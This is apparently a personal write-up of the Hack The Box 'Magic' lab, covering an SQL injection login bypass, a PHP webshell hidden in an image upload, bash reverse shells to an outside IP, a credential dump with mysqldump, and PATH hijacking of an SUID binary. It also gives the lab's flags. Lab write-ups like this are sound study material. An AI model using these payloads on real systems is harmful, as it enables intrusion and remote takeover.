+++
title = "HTB - Magic"
date = 2025-01-14
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.185
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 08:12 EST
Nmap scan report for 10.10.10.185
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.49 seconds
```

### Enumeration
Going through rudimentary process here. SSH likely a late stage pivot, if anything.
Port 80 running Apache version that isn't likely our POE. Magic Portfolio is interesting.
My time solving boxes, I've learned about software that is niche an may not be initially recognizable.
My feroxbuster findings poked at an upload directory, but I had no access. Redefining to look for php extensions, I found a login portal.
Searchsploit has a number of entries on this Magic Portfolio software, but nothing helpful. 
I brought requests into burp to see if i could pry aything more, but it seemed strapped down.
I assumed that the path forward as SQLi related, and validated with 0xdf walkthrough. Area of practice for sure.
`' or 1=1-- -` placed in the username field grants access, probably because the site queries the database like:
`SELECT * from users where username = '$username' and password = '$password';`, and turns it to 
`SELECT * from users where username = '' or 1=1-- -and password = 'admin';`.
We are brought to a portal, and cannot upload anything other than various image file types.
Exerpt from 0xdf about bypassing upload filters:
```
To check the filters on upload, I like to find the POST request where the legitimate image file was uploaded in Burp and send it to repeater. After making sure it successfully submits, I’ll start changing things to see where it break. There are three checks that a site typically employs with this kind of upload:

- file extension block/allow lists;
- mimetype or [Magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) for the file must match that of the allowed type(s);
- `Content-Type` header on the image must be image.

Some testing shows that there are at least two filters applied on upload: filename must end with `.jpg`, `.jpeg`, or `.png` and mimetype passes for images.

The second filter can be bypassed by putting PHP code into the middle of a valid image.

I’ll create a copy of my image and name it `avatar-mod.png`. Then I’ll open it with `vim` and add a simple PHP webshell to the middle of the file:
```
Pretty good explanation, and even better to play with. We can add our php webshell to the image:
`<?php system($_GET[cmd]); ?>`. Save it as image.php.png
Once uploaded, we can find it in the aforementioned uploads directory `/images/uploads/image.php.png`
To get execution, we can call for it in the url: `http://10.10.10.185/images/uploads/image.php.png?cmd=id`
We can see we are wwwdata. Lets call for a shell:
`http://10.10.10.185/images/uploads/image.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261'`
Stablilize
Once we're in, remember to stay the course. We see a database file, and upon checking it out, we get creds: `theseus:iamkingtheseus`
These do not work for `su` or `ssh`. Instead, we can investigate netstat -tnlp and validate an SQL instance on the box.
To find the installed tools to access, we can type `mys[tab] [tab] [tab]` and hit enter. Cool trick from 0xdf.
We see mysql dump, and once syntax is researched, we can probe:
`mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic`
We get `admin:Th3s3usW4sK1ng`
USER:`8478840c27313f6f2c6c60192a5c469a`

### Privilege Escalation
We can check SUID's for anything suspicious. One of those things that takes time to hone: `find / -perm -4000 -ls 2>/dev/null`
We see, thanks to 0xdf, the /bin/sysinfo, which isn't usually standard. When we analyze the output by running `sysinfo`,
we find that it references disks without calling the full path. This is suspect and susceptible to path hijacking.
When we validate external calls with `ltrace sysinfo`, we can see `popen`, which is used to open processes, makes a call to fdisk without specifying the full path.
To take advantage of this, we can create a reverse shell in the /dev/shm (why?)
`echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.16/9001 0>&1' > fdisk`
Give it executable permissions: `chmod +x fdisk` and run ./fdisk to validate
Update path to include /dev/shm: `export PATH="/dev/shm:$PATH"`
run `sysinfo` for callback
ROOT:`d376810283b75449355c3e367bf931f7`